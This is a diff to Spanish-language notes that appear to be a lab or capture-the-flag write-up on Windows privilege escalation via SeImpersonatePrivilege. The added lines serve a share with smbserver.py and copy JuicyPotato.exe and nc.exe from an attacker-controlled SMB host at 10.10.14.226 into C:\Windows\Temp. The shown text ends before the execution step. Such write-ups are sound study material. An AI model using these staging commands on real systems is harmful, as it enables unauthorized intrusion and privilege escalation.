@@ -86,6 +86,25 @@ whoami /priv
 
 Observamos que tenemos `SeImpersonatePrivilege` usaremos la herramienta de [[JUICY-POTATO]]
 Nos la compartiremos a través de un servidor *SMB* con [[SMBSERVER]]
+```shell
+smbserver.py smbFolder $(pwd)
+```
+
+Y ahora nos meteremos en el directorio `C:\Windows\Temp`
+Y ahí nos descargaremos el ejecutable de [[JUICY-POTATO]]
+```shell
+copy \\10.10.14.226\smbFolder\JuicyPotato.exe 
+```
+
+También deberemos de copiarnos el [[NETCAT]]
+```shell
+copy \\10.10.14.226\smbFolder\nc.exe
+```
+
+Ahora deberemos de ejecutar
+
+
+
 
 
 
